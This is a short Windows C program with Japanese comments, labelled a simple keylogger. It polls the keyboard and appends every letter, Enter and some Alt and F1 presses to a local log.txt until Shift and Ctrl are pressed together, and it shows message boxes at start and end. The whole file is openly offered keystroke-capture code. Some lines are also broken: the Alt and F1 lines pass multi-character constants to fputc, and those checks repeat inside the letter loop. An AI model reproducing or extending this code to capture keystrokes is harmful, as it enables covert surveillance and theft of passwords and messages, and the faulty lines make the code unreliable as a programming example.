//2010/06/15 Shirao
//簡単なキーロガー
//動作中に押されたキーを取得する（shift-ctrlで終了）

#define WIN32_LEAN_AND_MEAN  //exe縮小

#include <windows.h>
#include <stdio.h>

int APIENTRY WinMain( HINSTANCE hInstance,
                      HINSTANCE hPrevInstance,
                      LPSTR lpCmdLine,
                      int nShowCmd)
{
  FILE *fp;  //ログを書き込むファイルポインタ
  if(fopen_s(&fp, "log.txt", "a") != 0){
    MessageBox(GetActiveWindow(), L"fopen error", L"error", MB_ICONERROR);
    return -1;
  }
  MessageBox(GetActiveWindow(), L"Key Logger Start", L"Message", MB_OK);
  bool cntf = true;
  while(cntf){
    int c, k;
    //アルファベットキースキャンループ
    for(c = 'A'; c <= 'Z'; c++){
      //shiftが押されているか否か
      if(GetAsyncKeyState(VK_SHIFT) & 0x8000)
        k = c;  //大文字
      else
        k = c+('a'-'A');  //小文字
      //押されていたなら適切に出力
      if(GetAsyncKeyState(c) & 0x0001){
        fputc(k, fp); fflush(fp);
        continue;
      }
	  if(GetAsyncKeyState(VK_MENU)){
		  fputc('Alt',fp);fflush(fp);
	  }
	  if(GetAsyncKeyState(VK_F1)){
		  fputc('F1',fp);fflush(fp);
	  }
    //Enterで改行
      if(GetAsyncKeyState(VK_RETURN) & 0x0001){
        fputc('\n', fp); fflush(fp);
      }
    }
    //shift-ctrlで終了する
    if( (GetAsyncKeyState(VK_SHIFT) & 0x8000) &&
        (GetAsyncKeyState(VK_CONTROL) & 0x8000))
      cntf = false;
    Sleep(50);
  }
  _fcloseall();  //ファイルを閉じる
  MessageBox(GetActiveWindow(), L"Key Logger End", L"Message", MB_OK);
  return 0;
}

